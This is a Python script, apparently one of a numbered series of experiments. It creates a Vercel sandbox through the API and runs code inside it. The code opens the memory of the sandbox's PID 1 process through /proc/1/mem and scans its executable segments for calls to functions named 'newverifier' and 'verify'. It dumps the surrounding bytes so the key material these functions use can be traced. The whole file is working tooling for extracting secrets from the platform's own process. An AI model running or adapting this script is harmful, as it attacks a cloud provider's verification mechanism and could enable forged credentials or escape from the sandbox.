# 实验J216: 在内存text段搜索 newverifier(0x83abc0) 和 verify(0x83b3a0) 的所有调用点
# 调用点前0x80字节含参数构造(lea rip相对 = key字符串地址) -> dump 后本地反汇编找key来源
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=30000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj216"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, struct
out = open("/tmp/d216.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)

# text段: 从maps找 r-x 段
maps = open("/proc/1/maps").read()
text = []
for ln in maps.splitlines():
    try:
        rng, perm, off, dev, ino, *rest = ln.split()
    except ValueError:
        continue
    if "r-x" in perm or "r-xp" in perm:
        lo, hi = (int(x, 16) for x in rng.split("-"))
        if hi - lo >= 0x10000:
            text.append((lo, hi))
p("TEXT", [(hex(a), hex(b)) for a, b in text])

TARGETS = {0x83abc0: "newverifier", 0x83b3a0: "verify", 0x571700: "b64_alloc"}

# 扫描text找 call rel32 目标
for lo, hi in text:
    off = lo
    while off < hi:
        try:
            b = ra(off, min(65536, hi - off))
        except OSError:
            off += 65536
            continue
        # 找 E8 xx xx xx xx
        i = 0
        while i < len(b) - 5:
            if b[i] == 0xE8:
                rel = struct.unpack_from("<i", b, i + 1)[0]
                tgt = off + i + 5 + rel
                if tgt in TARGETS:
                    call_addr = off + i
                    p("CALL", TARGETS[tgt], hex(call_addr), "->", hex(tgt))
                    # dump 调用点前0x80 (参数构造) + 后0x20
                    try:
                        ctx = ra(call_addr - 0x80, 0x80 + 0x20)
                        p("CALLCTX", hex(call_addr - 0x80), ctx.hex())
                    except Exception as e:
                        p("CALLERR", repr(e))
            i += 1
        off += len(b)
p("done")
out.close()
os.close(fd)
'''
st = run_cmd(sid, CODE, "J216", timeout=200)
time.sleep(2)
bashfile(sid, "cat /tmp/d216.txt", "marker", 20000)
if st == "DEAD":
    print("\n!!! DEATH", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
